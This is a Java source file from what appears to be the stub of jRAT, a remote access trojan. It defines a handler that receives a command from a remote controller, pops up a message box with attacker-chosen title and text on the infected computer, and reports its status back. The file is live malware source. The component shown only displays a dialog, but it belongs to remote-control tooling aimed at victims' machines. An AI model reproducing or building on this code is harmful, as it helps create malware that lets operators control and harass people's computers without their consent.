package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.Constants;

import javax.swing.JOptionPane;
import javax.swing.UIManager;


public class Packet10Messagebox extends AbstractIncomingPacket {

	@Override
	public void read(final Connection con) throws Exception {
		boolean theme = con.readBoolean();

		if (theme) {
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
		}

		final int mode = con.readInt();
		final String title = con.readLine();
		final String message = con.readLine();

		new Thread() {
			public void run() {
				con.status(Constants.STATUS_DISPLAYED_MSGBOX);
				JOptionPane.showMessageDialog(null, message, title, mode);
			}
		}.start();
	}

}
